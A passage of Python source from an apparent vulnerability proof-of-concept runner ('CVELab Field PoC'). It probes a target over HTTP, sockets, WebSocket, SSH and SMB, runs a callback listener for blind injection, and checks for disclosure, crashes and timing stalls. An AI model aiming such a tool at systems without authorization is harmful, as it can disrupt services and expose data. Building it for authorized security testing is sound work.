        head = '--%s\r\nContent-Disposition: form-data; name="%s"' % (boundary, part["name"])
        if "value" in part:
            chunks.append((head + '\r\n\r\n' + part["value"] + '\r\n').encode("utf-8"))
            continue
        head += '; filename="%s"\r\nContent-Type: %s\r\n\r\n' % (
            part["filename"], part["content_type"]
        )
        chunks.append(head.encode("utf-8") + _part_bytes(part) + b"\r\n")
    chunks.append(("--%s--\r\n" % boundary).encode("utf-8"))
    return b"".join(chunks), "multipart/form-data; boundary=" + boundary


def tokens(response, extractor):
    """The values a response offers for the set-difference proof.

    A response is (status, body, headers). Evidence is not always in the body:
    a disclosed token often arrives in a header, and an authorization finding
    is often nothing but the status, 200 where it should have been 401.
    """
    status, body, headers = response
    if "status" in extractor:
        return [str(status)]
    if "header" in extractor:
        want = extractor["header"].lower()
        return [str(v) for k, v in (headers or {}).items() if k.lower() == want and str(v)]
    if "json_values" in extractor:
        try:
            parsed = json.loads(body)
        except json.JSONDecodeError:
            return []
        out = []
        _collect(parsed, extractor["json_values"], out)
        return out
    found = re.findall(extractor["regex"], body)
    return [m if isinstance(m, str) else m[0] for m in found]


_EXTRA_FOR = {"ssh": "paramiko", "smb": "impacket"}


def _require(module, extra):
    """Import what this transport needs, or say exactly how to get it.

    CVELab's core needs nothing installed and this script needs nothing for
    HTTP or a socket. A protocol with a real handshake cannot be spoken that
    way, so one package is needed, and a bare ImportError is not a useful way
    to learn which.
    """
    try:
        __import__(module)
    except ImportError:
        raise SystemExit(
            "this PoC speaks %s, which needs a library the standard one does not "
            "provide:\n    pip install %s\nor, with CVELab installed:\n    "
            "pip install 'cvelab[%s]'" % (extra, _EXTRA_FOR[extra], extra)
        ) from None
    return sys.modules[module]


def normalize_target(value):
    """One target, however the operator wrote it.

    An engagement names a host and a port -- 10.0.0.5:8080, [2001:db8::1]:443,
    app.example.com -- so a scheme is optional and http is assumed when none
    is given. A port alone picks no default: 443 is https, anything else http,
    which is what a plain host:port means in practice.
    """
    text = str(value).strip()
    if not text:
        raise SystemExit("--target is empty")
    transport = SPEC.get("transport", "http")
    if transport != "http":
        # Not a URL: these are a host and a port and nothing else, so a scheme
        # here would be a misunderstanding worth saying out loud.
        if "://" in text:
            raise SystemExit("--target is a host and port for this PoC, not a URL")
        try:
            split = urllib.parse.urlsplit("//" + text)
            host, port = split.hostname, split.port
        except ValueError as error:
            raise SystemExit("--target is not a usable host and port: %s" % error) from None
        # SSH and SMB have a conventional port, so a bare host means it.
        port = port or {"ssh": 22, "smb": 445, "ws": 80, "wss": 443}.get(transport)
        if not host or not port:
            raise SystemExit("--target needs a host and a port, e.g. 10.0.0.5:6379")
        if split.path or split.query or split.fragment:
            raise SystemExit("--target must be a host and port only")
        return (host, port)
    try:
        if "://" not in text:
            # urlsplit reads "10.0.0.5:8080" as scheme "10.0.0.5", and a bare
            # host as a path, so the scheme is decided here and the rest
            # parsed as an authority afterwards.
            port = urllib.parse.urlsplit("//" + text).port
            text = ("https://" if port == 443 else "http://") + text
        parsed = urllib.parse.urlsplit(text)
        parsed.port
    except ValueError as error:
        # A port out of range reaches urlsplit as ValueError. The operator
        # mistyped a target; a traceback is the wrong way to say so.
        raise SystemExit("--target is not a usable host and port: %s" % error) from None
    if parsed.scheme not in ("http", "https"):
        raise SystemExit(
            "--target must be http or https, or a bare host:port, not %r" % parsed.scheme
        )
    if not parsed.hostname:
        raise SystemExit("--target names no host, e.g. 10.0.0.5:8080 or https://host")
    if parsed.path not in ("", "/") or parsed.query or parsed.fragment:
        # Every request path comes from the spec and is appended to the base,
        # so a path here would silently prefix none of them.
        raise SystemExit("--target must be a host and port only, with no path")
    # Rebuilt rather than trimmed: the base is exactly the scheme and the
    # authority the operator named, with nothing for a request path to
    # collide with.
    return "%s://%s" % (parsed.scheme, parsed.netloc)


class Target:
    def __init__(self, base, insecure, timeout, read_timeout=5):
        self.transport = SPEC.get("transport", "http")
        self.timeout = timeout
        self.read_timeout = read_timeout
        self.inputs = {}
        self.insecure = insecure
        self.ctx = None
        # What the target has set so far. Every HTTP request used to stand
        # alone, so a login handshake could not be expressed at all: MobSF's
        # CSRF finding needs a csrftoken read from the login page, a sessionid
        # from the POST that follows, and both carried into the forged
        # request. A client keeps cookies; so does this.
        self.cookies = {}
        if self.transport == "http":
            base = normalize_target(base)
            parsed = urllib.parse.urlsplit(base)
            self.base = self.http_base = base.rstrip("/")
            if parsed.scheme == "https" and insecure:
                self.ctx = ssl.create_default_context()
                self.ctx.check_hostname = False
                self.ctx.verify_mode = ssl.CERT_NONE
            return
        self.host, self.port = normalize_target(base)
        self.base = "%s://%s:%s" % (self.transport, self.host, self.port)
        # A WebSocket service is an HTTP server that upgrades, on this same
        # host and port, so a discovery step has somewhere to run.
        self.http_base = "%s://%s:%s" % (
            "https" if self.transport == "wss" else "http", self.host, self.port
        )
        if self.transport in ("tls", "wss"):
            self.ctx = ssl.create_default_context()
            if insecure:
                self.ctx.check_hostname = False
                self.ctx.verify_mode = ssl.CERT_NONE

    def keep_cookies(self, set_cookie_headers):
        """Remember what the target set, by name, for the requests that follow.

        Only the name and the value: no domain, path or expiry, because this
        script talks to exactly one host for the length of one run and a
        cookie that was set during it is one the server wants back. A cookie
        the spec writes itself in a header wins, so an operator's own session
        is never overwritten by one picked up on the way.
        """
        for header in set_cookie_headers:
            pair = str(header).split(";", 1)[0].strip()
            if "=" not in pair:
                continue
            name, _, value = pair.partition("=")
            name, value = name.strip(), value.strip()
            if not name:
                continue
            if value in ("", '""', "deleted"):
                self.cookies.pop(name, None)
            else:
                self.cookies[name] = value

    def about_target(self):
        """What the spec may say about the host it was pointed at.

        A spec names no host, because the operator supplies it. But an effect
        can be about the target's own address -- an Origin the server should
        reject, a redirect back to itself -- and only the run knows it.
        """
        if self.transport == "http":
            authority = urllib.parse.urlsplit(self.base).netloc
        else:
            authority = "%s:%s" % (self.host, self.port)
        return {"target": authority, "targetHost": authority.rsplit(":", 1)[0].strip("[]")}

    def fill(self, obj, ctx):
        """Substitute discovered names and the operator's own inputs.

        The inputs are merged here rather than into the context, because the
        context is printed and recorded with every finding: a credential
        passed on the command line must not end up in the output or in the
        JSON a report quotes.
        """
        return _subst(obj, dict(self.about_target(), **dict(self.inputs, **ctx)))

    def discover_exchange(self, messages):
        """Run a discovery step, which is HTTP whatever the probe speaks.

        Over ws and wss the upgrade route and the pages are the same server,
        so a value the probe needs -- a channel token in served HTML, an id
        from a JSON route -- is read with an ordinary request first. Storybook
        lost its script to exactly this: the token is in the HTML and the
        effect is in the frames after the upgrade.
        """
        if self.transport in ("ws", "wss"):
            last = (0, "", {})
            for message in messages:
                last = self.send(message)
            return last
        return self.exchange(messages)

    def exchange(self, messages, ctx=None):
        """Run one sequence and return (status, text, headers) for the proof.

        Over HTTP each request stands alone and the last response is what is
        compared, as before. Over a socket the whole sequence shares one
        connection, because a protocol needing a login before a command
        cannot be expressed as independent messages, and the text returned is
        everything read during the exchange -- a transcript, not a last line.
        """
        if self.transport == "http":
            last = (0, "", {})
            for message in messages:
                last = self.send(message)
            return last
        if self.transport in ("ws", "wss"):
            return self._ws_exchange(messages, ctx)
        if self.transport == "ssh":
            return (0, self._ssh_exchange(messages), {})
        if self.transport == "smb":
            return (0, self._smb_exchange(messages), {})
        return (0, self._socket_exchange(messages), {})

    def auth(self):
        """The spec's auth block with the operator's own values filled in."""
        return {k: v for k, v in _subst(SPEC.get("auth") or {}, self.inputs).items() if v}

    def _ssh_exchange(self, messages):
        """Run the commands over one authenticated session.

        This reaches a weakness in what a session is allowed to do: a
        restricted shell that can be escaped, a file an account should not be
        able to read, an injection in something the service runs for you. It
        is not a way to attack the handshake, which the library performs
        correctly on purpose.

        The host key is printed before authenticating and then accepted. A
        target you have just been given is not in known_hosts, so refusing an
        unknown key would make this unusable -- but a credential travels over
        this connection, so the fingerprint is put in front of you to check
        against whatever the owner told you it should be.
        """
        paramiko = _require("paramiko", "ssh")
        credentials = self.auth()
        key = credentials.pop("private_key", "")
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        transcript = []
        try:
            client.connect(
                self.host, port=self.port, timeout=self.timeout,
                allow_agent=False, look_for_keys=False,
                key_filename=key or None,
                username=credentials.get("username") or None,
                password=credentials.get("password") or None,
            )
            remote = client.get_transport().get_remote_server_key()
            print("hostkey  %s %s" % (remote.get_name(), remote.get_fingerprint().hex()),
                  file=sys.stderr)
            for message in messages:
                _, out, err = client.exec_command(
                    message["exec"], timeout=self.read_timeout
                )
                transcript.append(out.read(1024 * 1024).decode("utf-8", "replace"))
                transcript.append(err.read(64 * 1024).decode("utf-8", "replace"))
        except paramiko.AuthenticationException as error:
            raise SystemExit(
                "%s refused the credentials: %s. Pass them with --input." % (self.base, error)
            )
        except (OSError, paramiko.SSHException) as error:
            raise SystemExit("cannot use %s: %s" % (self.base, error))
        finally:
            client.close()
        return "".join(transcript)

    def _smb_exchange(self, messages):
        """List or read what the session is given access to.

        The class this reaches is access: a share or a path reachable by an
        account that should not reach it. Reads are capped and a path cannot
        climb out of its share, which the spec refuses before anything runs.
        """
        smb = _require("impacket.smbconnection", "smb")
        credentials = self.auth()
        try:
            conn = smb.SMBConnection(self.host, self.host, sess_port=self.port,
                                     timeout=self.timeout)
            conn.login(credentials.get("username", ""), credentials.get("password", ""),
                       credentials.get("domain", ""))
        except smb.SessionError as error:
            # Refused credentials are not an observation about the weakness.
            raise SystemExit(
                "%s refused the credentials: %s. Pass them with --input."
                % (self.base, error)
            )
        except Exception as error:
            raise SystemExit("cannot reach %s: %s" % (self.base, error))
        transcript = []
        try:
            for message in messages:
                try:
                    transcript.append(self._smb_op(conn, message))
                except smb.SessionError as refused:
                    # The server answered, and what it answered is the
                    # observation. A share that is gone, or a path an account
                    # may not have, is exactly what a fixed build says -- so
                    # recording it keeps the run a NOT_OBSERVED rather than a
                    # run that never finished, which would prove nothing
                    # either way.
                    transcript.append("%s\n" % refused)
        except OSError as error:
            # The session itself broke, which is not an answer about anything.
            raise SystemExit("cannot use %s: %s" % (self.base, error))
        finally:
            try:
                conn.close()
            except Exception:
                pass
        return "".join(transcript)

    def _smb_op(self, conn, message):
        op = message["op"]
        if op == "list_shares":
            names = []
            for share in conn.listShares():
                try:
                    names.append(share["shi1_netname"][:-1])
                except (KeyError, TypeError):
                    names.append(str(share))
            return "\n".join(names) + "\n"
        if op == "list_path":
            pattern = message["path"].rstrip("/") + "/*"
            listed = [entry.get_longname() for entry in conn.listPath(message["share"], pattern)]
            return "\n".join(listed) + "\n"
        chunks = []
        size = [0]

        def collect(data):
            if size[0] < 1024 * 1024:
                size[0] += len(data)
                chunks.append(data)

        conn.getFile(message["share"], message["path"], collect)
        return b"".join(chunks).decode("utf-8", "replace")

    #: What RFC 6455 says a server must echo back, hashed with the key.
    _WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

    def _ws_exchange(self, messages, ctx=None):
        """Upgrade, then talk in frames, over one connection.

        The handshake is ordinary HTTP and the framing is a documented wire
        format, so this needs nothing installed. The accept header is checked
        rather than assumed: a plain 200 from a server that does not speak
        WebSocket would otherwise be read as a successful upgrade and every
        later read would return nothing, which looks exactly like an absent
        effect.

        The upgrade's own status and headers come back with the frames,
        because for an Origin check they are the finding: 101 to a request
        carrying a foreign Origin, where a fixed build answers 403. When the
        spec reads only those, a refused upgrade is that observation and is
        returned; when the evidence is in the frames, a server that did not
        upgrade has told us nothing and that stays an error.
        """
        key = base64.b64encode(uuid.uuid4().bytes).decode()
        try:
            sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
        except OSError as error:
            raise SystemExit("cannot reach %s: %s" % (self.base, error))
        transcript = []
        try:
            if self.transport == "wss":
                context = ssl.create_default_context()
                if self.insecure:
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.host)
            headers = {
                "Host": "%s:%s" % (self.host, self.port),
                "Upgrade": "websocket",
                "Connection": "Upgrade",
                "Sec-WebSocket-Key": key,
                "Sec-WebSocket-Version": "13",
                "User-Agent": "CVELab-Field-PoC/1.0",
            }
            # Filled like a request, because that is what it is: the token a
            # discovery step read has to reach the upgrade, and an Origin the
            # server should reject is often the target's own address. Sent
            # literally, {{token}} went on the wire as six characters and
            # Storybook refused the upgrade on both builds.
            headers.update(self.fill(SPEC.get("ws_headers") or {}, ctx or {}))
            request = "GET %s HTTP/1.1\r\n%s\r\n\r\n" % (
                self.fill(SPEC.get("ws_path", "/"), ctx or {}),
                "\r\n".join("%s: %s" % kv for kv in headers.items()),
            )
            sock.settimeout(self.timeout)
            sock.sendall(request.encode())
            reply = b""
            while b"\r\n\r\n" not in reply and len(reply) < 65536:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                reply += chunk
            head = reply.split(b"\r\n\r\n", 1)[0].decode("utf-8", "replace")
            lines = head.split("\r\n")
            upgraded = {}
            for line in lines[1:]:
                name, _, value = line.partition(":")
                if value:
                    upgraded[name.strip()] = value.strip()
            parts = lines[0].split(" ")
            code = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
            if code != 101:
                if _handshake_is_the_finding():
                    return code, "", upgraded
                raise SystemExit(
                    "%s did not upgrade to WebSocket: %s" % (self.base, lines[0][:120])
                )
            expected = base64.b64encode(
                hashlib.sha1((key + self._WS_GUID).encode()).digest()
            ).decode()
            if expected.lower() not in head.lower():
                raise SystemExit(
                    "%s accepted the upgrade without the right "
                    "Sec-WebSocket-Accept, so it is not speaking WebSocket" % self.base
                )
            leftover = reply.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in reply else b""
            for message in messages:
                payload = (
                    bytes.fromhex(message["send_hex"]) if "send_hex" in message
                    else str(message.get("send", "")).encode("utf-8")
                )
                if payload:
                    self._ws_write(sock, payload, 2 if "send_hex" in message else 1)
                text, leftover = self._ws_read(sock, message, leftover)
                transcript.append(text)
        except ssl.SSLError as error:
            raise SystemExit(
                "TLS failed against %s: %s (--insecure skips verification)"
                % (self.base, error)
            )
        except OSError as error:
            raise SystemExit("cannot talk to %s: %s" % (self.base, error))
        finally:
            try:
                sock.close()
            except OSError:
                pass
        return code, "".join(transcript), upgraded

    def _ws_write(self, sock, payload, opcode):
        """One masked frame. A client frame must be masked; a server's is not."""
        header = bytearray([0x80 | opcode])
        size = len(payload)
        if size < 126:
            header.append(0x80 | size)
        elif size < 65536:
            header.append(0x80 | 126)
            header += size.to_bytes(2, "big")
        else:
            header.append(0x80 | 127)
            header += size.to_bytes(8, "big")
        mask = uuid.uuid4().bytes[:4]
        header += mask
        masked = bytes(byte ^ mask[i % 4] for i, byte in enumerate(payload))
        sock.sendall(bytes(header) + masked)

    def _ws_read(self, sock, message, buffered):
        """Frames until the delimiter, the cap, or the peer goes quiet.

        A ping is answered so the server does not drop the connection
        mid-exchange, and a close ends the read rather than being reported as
        a failure: a server closing after it has answered is ordinary.
        """
        want = str(message.get("read_until") or "").encode("utf-8")
        cap = int(message.get("read_bytes", 1024 * 1024))
        sock.settimeout(self.read_timeout)
        out = bytearray()
        while len(out) < cap:
            frame, buffered = self._ws_frame(sock, buffered)
            if frame is None:
                break
            opcode, data = frame
            if opcode == 8:
                break
            if opcode == 9:
                self._ws_write(sock, data, 10)
                continue
            if opcode == 10:
                continue
            out += data
            if want and want in bytes(out):
                break
        return bytes(out).decode("utf-8", "replace"), buffered

    def _ws_frame(self, sock, buffered):
        """One frame, or None when the peer stops. Returns (opcode, payload)."""
        def take(count):
            nonlocal buffered
            while len(buffered) < count:
                try:
                    chunk = sock.recv(65536)
                except (TimeoutError, ssl.SSLWantReadError):
                    return None
                except OSError as error:
                    raise SystemExit("cannot read from %s: %s" % (self.base, error))
                if not chunk:
                    return None
                buffered += chunk
            head, buffered = buffered[:count], buffered[count:]
            return head

        first = take(2)
        if first is None:
            return None, buffered
        opcode = first[0] & 0x0F
        size = first[1] & 0x7F
        if size == 126:
            more = take(2)
            if more is None:
                return None, buffered
            size = int.from_bytes(more, "big")
        elif size == 127:
            more = take(8)
            if more is None:
                return None, buffered
            size = int.from_bytes(more, "big")
        if size > 8 * 1024 * 1024:
            raise SystemExit("%s sent a frame larger than 8 MiB" % self.base)
        body = take(size) if size else b""
        if body is None:
            return None, buffered
        return (opcode, bytes(body)), buffered

    def _socket_exchange(self, messages):
        try:
            sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
        except OSError as error:
            raise SystemExit("cannot reach %s: %s" % (self.base, error))
        transcript = []
        try:
            if self.ctx is not None:
                sock = self.ctx.wrap_socket(sock, server_hostname=self.host)
            for message in messages:
                payload = (
                    bytes.fromhex(message["send_hex"]) if "send_hex" in message
                    else str(message.get("send", "")).encode("utf-8")
                )
                if payload:
                    sock.sendall(payload)
                transcript.append(self._read(sock, message))
        except ssl.SSLError as error:
            raise SystemExit(
                "TLS failed against %s: %s (--insecure skips verification)"
                % (self.base, error)
            )
        except OSError as error:
            raise SystemExit("cannot talk to %s: %s" % (self.base, error))
        finally:
            try:
                sock.close()
            except OSError:
                pass
        return "".join(transcript)

    def _read(self, sock, message):
        """Read until the delimiter, the cap, or the peer goes quiet.

        A quiet peer is not an error: plenty of protocols answer and then wait
        for the next command, so a read that times out returns what it has.
        read_until ends it at once and is what a spec should say when it can.
        """
        want = str(message.get("read_until") or "").encode("utf-8")
        cap = int(message.get("read_bytes", 1024 * 1024))
        sock.settimeout(self.read_timeout)
        chunks, size = [], 0
        while size < cap:
            try:
                chunk = sock.recv(min(65536, cap - size))
            except (TimeoutError, ssl.SSLWantReadError):
                break
            except OSError as error:
                raise SystemExit("cannot read from %s: %s" % (self.base, error))
            if not chunk:
                break
            chunks.append(chunk)
            size += len(chunk)
            if want and want in b"".join(chunks):
                break
        return b"".join(chunks).decode("utf-8", "replace")

    def send(self, spec):
        path = str(spec.get("path", "/"))
        if not path.startswith("/"):
            raise SystemExit("request path must be relative")
        body = spec.get("body")
        headers = dict(spec.get("headers", {}))
        headers.setdefault("User-Agent", "CVELab-Field-PoC/1.0")
        if self.cookies and not any(name.lower() == "cookie" for name in headers):
            headers["Cookie"] = "; ".join(
                "%s=%s" % pair for pair in sorted(self.cookies.items())
            )
        data = None if body is None else str(body).encode()
        if spec.get("upload"):
            data, content_type = multipart(spec["upload"])
            if not any(name.lower() == "content-type" for name in headers):
                headers["Content-Type"] = content_type
        req = urllib.request.Request(
            self.http_base + path,
            data=data,
            headers=headers,
            method=str(spec.get("method", "GET")).upper(),
        )
        try:
            with urllib.request.urlopen(req, timeout=self.timeout, context=self.ctx) as r:
                headers_back = dict(r.headers.items())
                self.keep_cookies(r.headers.get_all("Set-Cookie") or [])
                return (r.status, r.read(8 * 1024 * 1024).decode("utf-8", "replace"),
                        headers_back)
        except urllib.error.HTTPError as e:
            # A refusal is a response, and for a status differential it is the
            # whole point: 401 here against 200 there is the finding. A
            # refusal can also set a cookie -- a login that answers 302 is the
            # usual way a session arrives.
            if e.headers:
                self.keep_cookies(e.headers.get_all("Set-Cookie") or [])
            return (e.code, e.read(8 * 1024 * 1024).decode("utf-8", "replace"),
                    dict(e.headers.items() if e.headers else []))
        except (OSError, http.client.HTTPException) as e:
            # Deliberately this wide. A server that dies mid-request answers
            # with RemoteDisconnected, which is ConnectionResetError and
            # BadStatusLine and neither of them is a URLError, so the clause
            # that named URLError, TimeoutError and SSLError let it past as an
            # unhandled traceback -- measured against a service_crash PoC,
            # where a dropped connection is the whole observation and came
            # back as a crashed script instead. OSError covers URLError,
            # TimeoutError, SSLError and the socket errors; HTTPException
            # covers a response that stops partway. HTTPError is matched by
            # the clause above, so a refusal is still a response.
            raise SystemExit("cannot reach %s: %s" % (self.http_base, e))


class Collector:
    """The script's own listener, for an effect that sends nothing back.

    A blind injection leaves no answer to read: the only evidence is the
    target reaching out. This listens for that directly rather than handing
    the data to a third-party collaborator service, which on a client
    engagement would route their traffic through infrastructure neither party
    controls. It speaks enough HTTP to answer a fetch, and records whatever
    arrives whether or not it is HTTP, because a payload may connect with
    something else entirely.
    """

    def __init__(self, bind_host, bind_port):
        self.hits = []
        self.lock = threading.Lock()
        collector = self

        class Handler(socketserver.BaseRequestHandler):
            def handle(self):
                self.request.settimeout(5)
                received = b""
                try:
                    while len(received) < 65536:
                        chunk = self.request.recv(8192)
                        if not chunk:
                            break
                        received += chunk
                        if b"\r\n\r\n" in received or b"\n\n" in received:
                            break
                except OSError:
                    pass
                text = received.decode("utf-8", "replace")
                with collector.lock:
                    collector.hits.append({
                        "from": self.client_address[0],
                        "at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                        "raw": text[:8192],
                    })
                if text[:8].upper().startswith(("GET", "POST", "HEAD", "PUT", "OPTIONS")):
                    try:
                        self.request.sendall(
                            b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n"
                            b"Connection: close\r\n\r\nok"
                        )
                    except OSError:
                        pass

        class Server(socketserver.ThreadingTCPServer):
            allow_reuse_address = True
            daemon_threads = True

        self.server = Server((bind_host, bind_port), Handler)
        self.host, self.port = self.server.server_address[0], self.server.server_address[1]
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()

    def clear(self):
        with self.lock:
            self.hits = []

    def wait(self, marker, seconds):
        """The first hit carrying this run's marker, or None.

        Only a hit carrying the marker counts: without it an unrelated
        request, or a callback a previous run's stored payload is still
        producing, would read as a result.
        """
        deadline = time.monotonic() + seconds
        while time.monotonic() < deadline:
            with self.lock:
                for hit in self.hits:
                    if marker in hit["raw"]:
                        return hit
            time.sleep(0.25)
        return None

    def close(self):
        self.server.shutdown()
        self.server.server_close()


MAX_CONTEXTS = 200


def _subst(obj, ctx):
    # Substituted into the JSON text, a discovered value carrying a quote or a
    # backslash broke json.loads or changed a neighbouring field. The value is
    # escaped as JSON first, so what lands in the text is always one string.
    s = json.dumps(obj)
    for key, value in ctx.items():
        s = s.replace("{{" + key + "}}", json.dumps(str(value))[1:-1])
    return json.loads(s)


def discover(target, steps):
    """Build the list of targets a check will test.

    Each step fans the run out: a query step binds every value its extractor
    returns, a derive step binds one value computed from names already bound.
    With no steps the check runs once against whatever the requests name on
    their own.
    """
    contexts = [{}]
    for step in steps:
        # Children are kept per parent and interleaved, so the cap takes a
        # share from each. Truncating a flat list let the first project's 250
        # issues fill it and every later project went untested, reported as a
        # clean run.
        families = []
        for ctx in contexts:
            children = []
            if "derive" in step:
                value = step["derive"]
                for key, bound in ctx.items():
                    value = value.replace("{{" + key + "}}", str(bound))
                nc = dict(ctx); nc[step["bind"]] = value; children.append(nc)
            else:
                last = target.discover_exchange(target.fill(step["query"], ctx))
                for token in tokens(last, step["extract"]):
                    nc = dict(ctx); nc[step["bind"]] = token; children.append(nc)
            families.append(children)
        grown = []
        for index in range(max([len(f) for f in families] or [0])):
            for family in families:
                if index < len(family):
                    grown.append(family[index])
        seen = set(); unique = []
        for ctx in grown:
            key = json.dumps(ctx, sort_keys=True)
            if key not in seen:
                seen.add(key); unique.append(ctx)
        if len(unique) > MAX_CONTEXTS:
            print("  [NOTE] %d targets found, testing the first %d"
                  % (len(unique), MAX_CONTEXTS), file=sys.stderr)
        contexts = unique[:MAX_CONTEXTS]
    return contexts


def _run_inband(target, check, ctx, show_bodies, findings):
    probe = target.exchange(target.fill(check["probe"], ctx), ctx)
    control = target.exchange(target.fill(check["control"], ctx), ctx)
    probe_tokens = tokens(probe, check["extract"])
    control_tokens = set(tokens(control, check["extract"]))
    seen = set()
    disclosed = [t for t in probe_tokens
                 if t not in control_tokens and not (t in seen or seen.add(t))]
    where = " ".join("%s=%s" % (k, v) for k, v in ctx.items()) or "(no discovery)"
    for value in disclosed:
        shown = value if show_bodies else (value[:120] + ("..." if len(value) > 120 else ""))
        print("  [DISCLOSED] %s via %s" % (repr(shown), check["label"]))
        if where != "(no discovery)":
            print("              at %s" % where)
        findings.append({"check": check["label"], "where": ctx, "value": value})


def _run_marker(target, check, ctx, show_bodies, findings):
    marker = "cvelab-" + uuid.uuid4().hex[:16]
    local = dict(ctx); local["marker"] = marker
    target.exchange(target.fill(check["probe"], local), local)
    obs_status, obs_body, _ = target.exchange(target.fill(check["observe"], local), local)
    needle = str(check["match"].get("body_contains", "{{marker}}")).replace("{{marker}}", marker)
    if needle in obs_body:
        print("  [REFLECTED] marker %s surfaced via %s (status=%s)" % (marker, check["label"], obs_status))
        if show_bodies:
            idx = obs_body.find(needle)
            print("              ...%s..." % obs_body[max(0, idx - 40):idx + len(needle) + 40])
        findings.append({"check": check["label"], "where": ctx, "marker": marker})


def _run_direct(target, check, ctx, show_bodies, findings):
    """The effect is in the one response the weakness allows you to ask for.

    No second reading to compare against: a request that correctly authorizes
    sees the data legitimately, so comparing the two says nothing. What says
    something is that this response came back at all, and that the same
    request against a fixed build does not produce it.
    """
    response = target.exchange(target.fill(check["probe"], ctx), ctx)
    status, body, _ = response
    expect = check["expect"]
    found = []
    if "status" in expect:
        if status == expect["status"]:
            found = [str(status)]
    elif "header" in expect:
        found = tokens(response, {"header": expect["header"]})
    elif "body_contains" in expect:
        needle = expect["body_contains"]
        if needle in body:
            found = [needle]
    else:
        found = tokens(response, expect["extract"])
    where = " ".join("%s=%s" % (k, v) for k, v in ctx.items()) or "(no discovery)"
    seen = set()
    for value in found:
        if value in seen:
            continue
        seen.add(value)
        shown = value if show_bodies else (value[:120] + ("..." if len(value) > 120 else ""))
        print("  [OBSERVED] %s via %s (status=%s)" % (repr(shown), check["label"], status))
        if where != "(no discovery)":
            print("             at %s" % where)
        findings.append({"check": check["label"], "where": ctx,
                         "value": value, "status": status})


def _run_oob(target, check, ctx, show_bodies, findings):
    marker = "cvelab-" + uuid.uuid4().hex[:16]
    local = dict(ctx)
    local["marker"] = marker
    local["callback"] = target.callback
    target.collector.clear()
    try:
        target.exchange(target.fill(check["probe"], local), local)
    except SystemExit as stopped:
        # The probe itself failing is not a negative result: nothing was
        # asked of the target, so say so rather than report silence.
        print("  [ERROR] probe did not complete: %s" % stopped, file=sys.stderr)
        raise
    hit = target.collector.wait(marker, target.callback_wait)
    if hit:
        print("  [CALLBACK] %s called back carrying marker %s via %s"
              % (hit["from"], marker, check["label"]))
        if show_bodies:
            print("              %s" % hit["raw"].strip().replace("\n", "\n              "))
        findings.append({"check": check["label"], "where": ctx,
                         "marker": marker, "from": hit["from"], "at": hit["at"]})


def _answered(target, messages, ctx=None):
    """Run a sequence and say whether the target answered, instead of exiting.

    Everywhere else an unreachable target ends the run, because silence from
    a host that was never going to answer proves nothing. For a crash the
    silence IS the observation, so here it is caught and returned.
    """
    try:
        return True, target.exchange(messages, ctx)
    except SystemExit as stopped:
        return False, str(stopped)


def _median(values):
    ordered = sorted(values)
    middle = len(ordered) // 2
    if len(ordered) % 2:
        return ordered[middle]
    return (ordered[middle - 1] + ordered[middle]) / 2.0


def _run_crash(target, check, ctx, show_bodies, findings):
    """The effect is that the service stops serving.

    Three steps, in this order, because any two of them can be explained
    away. A benign request first, so a host that was already down cannot be
    reported as one this script took down. Then the payload, which is
    expected not to come back. Then the benign request again: if it still
    answers, the payload merely timed out on a slow path and nothing is
    claimed, and only a service that answered before and does not now is a
    finding.

    This is the one strategy that leaves the target worse than it found it,
    which is why main() will not run it without --allow-disruption.
    """
    before, _ = _answered(target, target.fill(check["baseline"], ctx), ctx)
    if not before:
        # Not a negative result: there was nothing serving to crash.
        print("  [ERROR] %s did not answer the baseline request, so this run cannot say "
              "anything about a crash" % target.base, file=sys.stderr)
        return
    sent, detail = _answered(target, target.fill(check["probe"], ctx), ctx)
    if sent:
        status = detail[0]
        print("  [NO CRASH] the payload was answered (status=%s) via %s"
              % (status, check["label"]), file=sys.stderr)
        return
    # It did not answer. Give a dying process a moment to finish dying, then
    # ask the benign question again.
    time.sleep(2)
    after, _ = _answered(target, target.fill(check["baseline"], ctx), ctx)
    if after:
        print("  [INCONCLUSIVE] the payload got no answer but %s is still serving, so "
              "this looks like a slow path rather than a crash" % target.base,
              file=sys.stderr)
        return
    print("  [CRASHED] %s answered before the payload and does not answer after it, via %s"
          % (target.base, check["label"]))
    if show_bodies:
        print("            %s" % detail)
    findings.append({"check": check["label"], "where": ctx,
                     "served_before": True, "served_after": False,
                     "transport_error": detail})


def _run_timing(target, check, ctx, show_bodies, findings):
    """The effect is time: the same request shape, pathological input, stalls.

    Measured against its own control in the same instance and the same run,
    median of several, because a single pair of samples on a shared host is
    not a measurement. Both bars have to clear: the ratio, so an endpoint
    that is simply slow is not a finding, and the absolute floor, so a ratio
    between two sub-millisecond numbers is not one either.
    """
    def measure(messages):
        started = time.monotonic()
        answered, _ = _answered(target, target.fill(messages, ctx), ctx)
        elapsed = time.monotonic() - started
        if not answered:
            # A timeout is the stall, not a failure to observe: the request
            # ran past what the client would wait for. Recorded at the
            # timeout, which understates the effect rather than inventing a
            # number.
            return float(target.timeout), False
        return elapsed, True

    # Every control measurement first, then the probes. Alternating them
    # sounds fairer and is wrong here, measured: the payload this strategy is
    # for occupies the service, and a single-threaded server never gets back
    # to the next request. Against a ReDoS stand-in that way round reported
    # 30s for the payload and 30s for the benign input after it -- 1.0x, no
    # finding, for a weakness that had wedged the service outright. The
    # control has to be taken while the instance is still idle.
    control_times = [measure(check["control"])[0] for _ in range(check["repeats"])]
    probe_times = []
    timed_out = False
    for _ in range(check["repeats"]):
        elapsed, answered = measure(check["probe"])
        probe_times.append(elapsed)
        if not answered:
            # It never came back. Sending more would measure a service that
            # is already occupied by the last payload, and there is nothing
            # left to learn: this is the strongest reading this check has.
            timed_out = True
            break
    fast = _median(control_times)
    slow = _median(probe_times)
    ratio = (slow / fast) if fast > 0 else float("inf")
    print("  measured %s: benign %.3fs, payload %.3fs (%.1fx)"
